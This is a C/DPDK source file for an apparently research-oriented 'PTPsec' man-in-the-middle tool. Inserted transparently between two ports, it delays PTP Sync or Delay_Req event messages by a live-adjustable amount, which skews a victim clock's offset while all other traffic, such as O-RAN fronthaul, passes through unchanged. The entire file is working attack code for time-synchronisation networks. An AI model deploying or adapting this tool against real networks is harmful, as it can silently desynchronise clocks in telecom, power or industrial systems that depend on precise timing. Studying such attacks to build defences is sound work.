/* SPDX-License-Identifier: BSD-3-Clause
 * PTPsec - delay-only MitM forwarder (stock DPDK, any PMD)
 *
 * A transparent L2 bump-in-the-wire for PTP delay attacks. In contrast to the
 * i210 transparent-clock variant in ../mitm-attacker, this build does NOT
 * timestamp packets, does NOT touch the correctionField, and needs no HWTS or
 * PPS hardware. It therefore runs on plain upstream DPDK on any poll-mode
 * driver (Intel X710/i40e, Mellanox mlx5, Broadcom bnxt, ...). No driver patch.
 *
 * Behaviour:
 *   - Every frame is forwarded between the two ports byte-for-byte, unmodified.
 *   - PTP *event* messages (Sync, Delay_Req) in the attacked direction are held
 *     back by a configurable delay to inject path asymmetry. The victim slave's
 *     clock offset then shifts by delay/2.
 *   - All other traffic (e.g. O-RAN eCPRI C/U/M-plane) is forwarded immediately.
 *     The delay is implemented with a small release queue, NOT a busy-wait, so a
 *     held PTP packet never stalls the fronthaul user plane.
 *
 * Direction is chosen by the sign of the delay (microseconds), matching the
 * original attacker's convention:
 *     delay > 0   ->  delay Delay_Req   (slave -> master path)
 *     delay < 0   ->  delay Sync        (master -> slave path)
 *     delay = 0   ->  pure pass-through (no attack)
 *
 * Live control: write an integer number of microseconds to ./delay.txt. It is
 * re-read ~10x per second; no restart needed. Example: `echo -50 > delay.txt`.
 *
 * Transport handling: L2 PTP (EtherType 0x88F7), including one or two stacked
 * VLAN tags (802.1Q / QinQ, as used on O-RAN fronthaul), and UDP/IPv4 PTP
 * (dst port 319/320).
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <inttypes.h>
#include <stdio.h>
#include <signal.h>

#include <rte_eal.h>
#include <rte_errno.h>
#include <rte_ethdev.h>
#include <rte_cycles.h>
#include <rte_lcore.h>
#include <rte_mbuf.h>
#include <rte_ether.h>
#include <rte_ip.h>
#include <rte_udp.h>

#define RX_RING_SIZE    1024
#define TX_RING_SIZE    1024
#define NUM_MBUFS       8191
#define MBUF_CACHE_SIZE 256
#define BURST_SIZE      32
#define NUM_PORTS       2
#define STATS_INTERVAL_S 2      /* per-port drop-counter dump cadence */

#ifndef RTE_ETHER_TYPE_1588
#define RTE_ETHER_TYPE_1588 0x88F7
#endif

/* PTP UDP transport ports (unused by G.8275.1 L2, kept for generality). */
#define PTP_EVENT_PORT   319
#define PTP_GENERAL_PORT 320

/* PTP v2 messageType is the low nibble of byte 0 (high nibble = majorSdoId). */
#define PTP_SYNC       0x0
#define PTP_DELAY_REQ  0x1

/* Only the first byte (majorSdoId|messageType) is needed to classify. */
struct __attribute__((__packed__)) ptp_hdr {
	uint8_t  msg_type;
	uint8_t  version;
	uint16_t msg_len;
};

/*
 * Release queue: packets awaiting their delayed egress. PTP event rate is low
 * (~16 pps) and delays are small, so only a handful are ever in flight; a small
 * fixed array is plenty. Entries are released in arrival order.
 */
#define HOLD_MAX 1024
struct held_pkt {
	struct rte_mbuf *m;
	uint16_t         out_port;
	uint64_t         release_tsc;
};
static struct held_pkt hold[HOLD_MAX];
static unsigned        hold_count = 0;

static volatile bool force_quit = false;
static int64_t  g_delay_us = 0;   /* current attack delay, signed microseconds */
static uint64_t tsc_hz;
static uint16_t g_ports[NUM_PORTS];

/* Previous stats snapshot per port, for delta (rate) computation. */
struct port_stat_prev {
	uint64_t ipackets, opackets, imissed, rx_nombuf, oerrors, ierrors;
};
static struct port_stat_prev prev_stats[NUM_PORTS];

static void
handle_signal(int sig)
{
	if (sig == SIGINT || sig == SIGTERM) {
		printf("\nSignal %d received, shutting down...\n", sig);
		force_quit = true;
	}
}

static inline int
port_init(uint16_t port, struct rte_mempool *mbuf_pool)
{
	struct rte_eth_conf port_conf;
	struct rte_eth_dev_info dev_info;
	struct rte_eth_txconf txconf;
	uint16_t nb_rxd = RX_RING_SIZE, nb_txd = TX_RING_SIZE;
	int retval;

	if (!rte_eth_dev_is_valid_port(port))
		return -1;

	/* Zero the config, then query this NIC's capabilities. */
	memset(&port_conf, 0, sizeof(port_conf));

	retval = rte_eth_dev_info_get(port, &dev_info);
	if (retval != 0) {
		printf("port %u: info_get failed: %s\n", port, strerror(-retval));
		return retval;
	}

	/* Accept oversized/jumbo frames (O-RAN eCPRI U-plane) without dropping.
	 * With RX scatter + TX multi-seg, standard 2KB mbufs chain as needed. */
	uint16_t want_mtu = 9000;
	if (dev_info.max_mtu && want_mtu > dev_info.max_mtu)
		want_mtu = dev_info.max_mtu;
	port_conf.rxmode.mtu = want_mtu;

	/* Turn on scatter/gather so jumbo frames chain across mbufs. */
	if (dev_info.rx_offload_capa & RTE_ETH_RX_OFFLOAD_SCATTER)
		port_conf.rxmode.offloads |= RTE_ETH_RX_OFFLOAD_SCATTER;
	if (dev_info.tx_offload_capa & RTE_ETH_TX_OFFLOAD_MULTI_SEGS)
		port_conf.txmode.offloads |= RTE_ETH_TX_OFFLOAD_MULTI_SEGS;
	if (dev_info.tx_offload_capa & RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE)
		port_conf.txmode.offloads |= RTE_ETH_TX_OFFLOAD_MBUF_FAST_FREE;

	/* Apply the config, then clamp descriptor counts to what the NIC allows. */
	retval = rte_eth_dev_configure(port, 1, 1, &port_conf);
	if (retval != 0)
		return retval;

	retval = rte_eth_dev_adjust_nb_rx_tx_desc(port, &nb_rxd, &nb_txd);
	if (retval != 0)
		return retval;

	/* One RX queue, one TX queue -- this is a single-core forwarder. */
	retval = rte_eth_rx_queue_setup(port, 0, nb_rxd,
			rte_eth_dev_socket_id(port), NULL, mbuf_pool);
	if (retval < 0)
		return retval;

	txconf = dev_info.default_txconf;
	txconf.offloads = port_conf.txmode.offloads;
	retval = rte_eth_tx_queue_setup(port, 0, nb_txd,
			rte_eth_dev_socket_id(port), &txconf);
	if (retval < 0)
		return retval;

	/* Start the port, then flip on promiscuous mode below. */
	retval = rte_eth_dev_start(port);
	if (retval < 0)
		return retval;

	/* Transparent bridge: must see and forward all frames. */
	retval = rte_eth_promiscuous_enable(port);
	if (retval != 0) {
		printf("port %u: promiscuous enable failed: %s\n",
		       port, rte_strerror(-retval));
		return retval;
	}

	struct rte_ether_addr addr;
	rte_eth_macaddr_get(port, &addr);
	printf("Port %u up  MAC %02x:%02x:%02x:%02x:%02x:%02x  (mtu %u)\n",
	       port, RTE_ETHER_ADDR_BYTES(&addr), want_mtu);
	return 0;
}

/*
 * Locate the PTP header inside a frame, skipping up to two VLAN tags. Handles
 * L2 PTP (0x88F7) and UDP/IPv4 PTP (dst port 319/320). Length-guarded against
 * runt/malformed frames. Returns a pointer to the PTP header, or NULL.
 */
static inline struct ptp_hdr *
find_ptp(struct rte_mbuf *m)
{
	/* Reject runts, then start walking headers from the Ethernet type. */
	const uint16_t dlen = rte_pktmbuf_data_len(m);
	if (dlen < sizeof(struct rte_ether_hdr))
		return NULL;

	struct rte_ether_hdr *eth = rte_pktmbuf_mtod(m, struct rte_ether_hdr *);
	uint16_t etype = rte_be_to_cpu_16(eth->ether_type);
	uint32_t off = sizeof(*eth);

	/* Skip up to two stacked VLAN tags (802.1Q / QinQ) to reach the real ethertype. */
	for (int i = 0; i < 2; i++) {
		if (etype != RTE_ETHER_TYPE_VLAN && etype != RTE_ETHER_TYPE_QINQ)
			break;
		if (off + sizeof(struct rte_vlan_hdr) > dlen)
			return NULL;
		struct rte_vlan_hdr *vh =
			rte_pktmbuf_mtod_offset(m, struct rte_vlan_hdr *, off);
		etype = rte_be_to_cpu_16(vh->eth_proto);
		off += sizeof(*vh);
	}

	/* L2 PTP: the header sits directly after the (VLAN-stripped) ethertype. */
	if (etype == RTE_ETHER_TYPE_1588) {
		if (off + sizeof(struct ptp_hdr) > dlen)
			return NULL;
		return rte_pktmbuf_mtod_offset(m, struct ptp_hdr *, off);
	}

	/* UDP/IPv4 PTP: descend through the IP header into the UDP header. */
	if (etype == RTE_ETHER_TYPE_IPV4) {
		if (off + sizeof(struct rte_ipv4_hdr) > dlen)
			return NULL;
		struct rte_ipv4_hdr *ip =
			rte_pktmbuf_mtod_offset(m, struct rte_ipv4_hdr *, off);
		if (ip->next_proto_id != IPPROTO_UDP)
			return NULL;
		uint32_t ihl = (ip->version_ihl & 0x0F) * 4;
		if (ihl < sizeof(struct rte_ipv4_hdr))
			return NULL;
		uint32_t udp_off = off + ihl;
		if (udp_off + sizeof(struct rte_udp_hdr) + sizeof(struct ptp_hdr) > dlen)
			return NULL;
		struct rte_udp_hdr *udp =
			rte_pktmbuf_mtod_offset(m, struct rte_udp_hdr *, udp_off);
		/* Only PTP's event/general ports count as PTP traffic. */
		uint16_t dport = rte_be_to_cpu_16(udp->dst_port);
		if (dport != PTP_EVENT_PORT && dport != PTP_GENERAL_PORT)
			return NULL;
		return rte_pktmbuf_mtod_offset(m, struct ptp_hdr *,
				udp_off + sizeof(struct rte_udp_hdr));
	}
	return NULL;
}

/* How long (in TSC cycles) this packet must be held. 0 = forward now. */
static inline uint64_t
attack_hold_cycles(struct rte_mbuf *m)
{
	int64_t d = g_delay_us;
	/* Fast path: no active attack, skip PTP classification entirely. */
	if (d == 0)
		return 0;

	struct ptp_hdr *ptp = find_ptp(m);
	if (ptp == NULL)
		return 0;

	uint8_t mtype = ptp->msg_type & 0x0F;

	/* Sign of the delay picks the attacked direction and message type. */
	if (d > 0 && mtype == PTP_DELAY_REQ)
		return (uint64_t)d * tsc_hz / 1000000ULL;
	if (d < 0 && mtype == PTP_SYNC)
		return (uint64_t)(-d) * tsc_hz / 1000000ULL;

	return 0;
}

static inline void
tx_one(uint16_t port, struct rte_mbuf *m)
{
	if (rte_eth_tx_burst(port, 0, &m, 1) < 1)
		rte_pktmbuf_free(m);
}

/* Release any held packets whose time has come, preserving arrival order. */
static inline void
drain_hold(uint64_t now)
{
	unsigned w = 0;
	/* Compact in place: release due packets, pull the rest down to fill gaps. */
	for (unsigned r = 0; r < hold_count; r++) {
		if ((int64_t)(now - hold[r].release_tsc) >= 0) {
			tx_one(hold[r].out_port, hold[r].m);
		} else {
			if (w != r)
				hold[w] = hold[r];
			w++;
		}
	}
	hold_count = w;
}

/*
 * Per-port drop counters. The key single-core-overload signal is `miss`
 * (imissed): frames the NIC dropped because the RX ring was full, i.e. the core
 * didn't dequeue fast enough. `nombuf` is mbuf-pool exhaustion; `oerr` is TX
 * drops (egress can't keep up); `ierr` is link-layer errors (cabling/SFP, not
 * load). A "+N" delta and the DROPPING flag mean it happened this interval.
 */
static void
print_stats(uint64_t now, uint64_t last_tsc)
{
	/* Elapsed seconds since the last print, for the pps rate calculation. */
	double interval_s = last_tsc ? (double)(now - last_tsc) / tsc_hz
	                             : (double)STATS_INTERVAL_S;

	for (unsigned i = 0; i < NUM_PORTS; i++) {
		uint16_t port = g_ports[i];
		struct rte_eth_stats s;
		if (rte_eth_stats_get(port, &s) != 0)
			continue;

		/* Diff against the last snapshot to get per-interval deltas. */
		struct port_stat_prev *p = &prev_stats[i];
		double rx_pps = (double)(s.ipackets - p->ipackets) / interval_s;
		double tx_pps = (double)(s.opackets - p->opackets) / interval_s;
		uint64_t d_miss = s.imissed   - p->imissed;
		uint64_t d_nob  = s.rx_nombuf - p->rx_nombuf;
		uint64_t d_oerr = s.oerrors   - p->oerrors;
		uint64_t d_ierr = s.ierrors   - p->ierrors;

		/* Print rates and drop deltas, flagging the line if anything dropped. */
		printf("[stats] p%u rx %9.0f pps tx %9.0f pps | "
		       "miss %"PRIu64" (+%"PRIu64") nombuf %"PRIu64" (+%"PRIu64") "
		       "oerr %"PRIu64" (+%"PRIu64") ierr %"PRIu64" (+%"PRIu64")%s\n",
		       port, rx_pps, tx_pps,
		       s.imissed, d_miss, s.rx_nombuf, d_nob,
		       s.oerrors, d_oerr, s.ierrors, d_ierr,
		       (d_miss || d_nob || d_oerr) ? "   <-- DROPPING" : "");

		/* Save this snapshot as the baseline for the next interval. */
		p->ipackets = s.ipackets; p->opackets = s.opackets;
		p->imissed  = s.imissed;  p->rx_nombuf = s.rx_nombuf;
		p->oerrors  = s.oerrors;  p->ierrors   = s.ierrors;
	}
}

static void
lcore_main(void)
{
	/* Burst buffer plus timers for the periodic config-reload and stats prints. */
	struct rte_mbuf *bufs[BURST_SIZE];
	uint64_t last_cfg_tsc = 0;
	uint64_t last_stats_tsc = 0;
	const uint64_t cfg_interval = tsc_hz / 10;  /* re-read delay.txt ~10 Hz */
	const uint64_t stats_interval = tsc_hz * STATS_INTERVAL_S;

	printf("\nForwarding %u <-> %u on core %u. [Ctrl+C to quit]\n",
	       g_ports[0], g_ports[1], rte_lcore_id());
	printf("Initial delay: %ld us\n", g_delay_us);
	printf("Stats every %ds: miss=RX HW drops (core too slow), "
	       "nombuf=mbuf exhaustion, oerr=TX drops, ierr=link errors\n",
	       STATS_INTERVAL_S);

	while (!force_quit) {
		/* Poll both ports each iteration; packets from `in` go out `out`. */
		for (unsigned i = 0; i < NUM_PORTS; i++) {
			const uint16_t in  = g_ports[i];
			const uint16_t out = g_ports[i ^ 1];
			const uint16_t nb_rx = rte_eth_rx_burst(in, 0, bufs, BURST_SIZE);

			/* Forward now, queue for delayed release, or fail open if full. */
			for (uint16_t p = 0; p < nb_rx; p++) {
				uint64_t hc = attack_hold_cycles(bufs[p]);
				if (hc == 0) {
					tx_one(out, bufs[p]);
				} else if (hold_count < HOLD_MAX) {
					hold[hold_count].m = bufs[p];
					hold[hold_count].out_port = out;
					hold[hold_count].release_tsc =
						rte_get_tsc_cycles() + hc;
					hold_count++;
				} else {
					/* queue full: fail open, forward now */
					tx_one(out, bufs[p]);
				}
			}
		}

		/* Release anything in the hold queue whose delay has elapsed. */
		uint64_t now = rte_get_tsc_cycles();
		drain_hold(now);

		/* Re-read the attack delay from disk roughly 10x per second. */
		if (now - last_cfg_tsc > cfg_interval) {
			last_cfg_tsc = now;
			FILE *f = fopen("./delay.txt", "r");
			if (f) {
				int64_t nd;
				if (fscanf(f, "%ld", &nd) == 1 && nd != g_delay_us) {
					printf("delay: %ld us -> %ld us  (%s path)\n",
					       g_delay_us, nd,
					       nd > 0 ? "Delay_Req" :
					       nd < 0 ? "Sync" : "none");
					g_delay_us = nd;
				}
				fclose(f);
			}
		}

		/* Print throughput/drop stats every STATS_INTERVAL_S seconds. */
		if (now - last_stats_tsc > stats_interval) {
			print_stats(now, last_stats_tsc);
			last_stats_tsc = now;
		}
	}

	/* Flush anything still held. */
	for (unsigned i = 0; i < hold_count; i++)
		tx_one(hold[i].out_port, hold[i].m);
	hold_count = 0;
}

int
main(int argc, char *argv[])
{
	struct rte_mempool *mbuf_pool;
	unsigned nb_ports;
	uint16_t portid;
	unsigned idx = 0;

	/* Hand argv to DPDK's EAL first; it consumes its own args (-l, -n, ...). */
	int ret = rte_eal_init(argc, argv);
	if (ret < 0)
		rte_exit(EXIT_FAILURE, "Error with EAL initialization\n");
	argc -= ret;
	argv += ret;

	/* Catch Ctrl+C / SIGTERM for a clean shutdown. */
	signal(SIGINT, handle_signal);
	signal(SIGTERM, handle_signal);

	/* Require exactly two DPDK-bound ports: the bump-in-the-wire. */
	nb_ports = rte_eth_dev_count_avail();
	if (nb_ports != NUM_PORTS)
		rte_exit(EXIT_FAILURE,
			 "Error: need exactly %d ports bound to DPDK, found %u\n",
			 NUM_PORTS, nb_ports);

	tsc_hz = rte_get_tsc_hz();

	/* Shared mbuf pool sized for both ports' RX/TX rings plus headroom. */
	mbuf_pool = rte_pktmbuf_pool_create("MBUF_POOL", NUM_MBUFS * nb_ports,
			MBUF_CACHE_SIZE, 0, RTE_MBUF_DEFAULT_BUF_SIZE,
			rte_socket_id());
	if (mbuf_pool == NULL)
		rte_exit(EXIT_FAILURE, "Cannot create mbuf pool\n");

	/* Initialize both ports and record their DPDK port IDs. */
	RTE_ETH_FOREACH_DEV(portid) {
		if (port_init(portid, mbuf_pool) != 0)
			rte_exit(EXIT_FAILURE, "Cannot init port %u\n", portid);
		g_ports[idx++] = portid;
	}

	/* This app only ever uses one lcore; flag it if more were given. */
	if (rte_lcore_count() > 1)
		printf("WARNING: %u lcores present, only 1 is used.\n",
		       rte_lcore_count());

	/* Seed the delay from the file if it already exists. */
	FILE *f = fopen("./delay.txt", "r");
	if (f) {
		if (fscanf(f, "%ld", &g_delay_us) != 1)
			g_delay_us = 0;
		fclose(f);
	}

	/* Run the forwarding loop until Ctrl+C / SIGTERM sets force_quit. */
	lcore_main();

	/* Tear down both ports and release DPDK resources. */
	printf("Cleaning up...\n");
	RTE_ETH_FOREACH_DEV(portid) {
		rte_eth_dev_stop(portid);
		rte_eth_dev_close(portid);
	}
	rte_eal_cleanup();
	return 0;
}
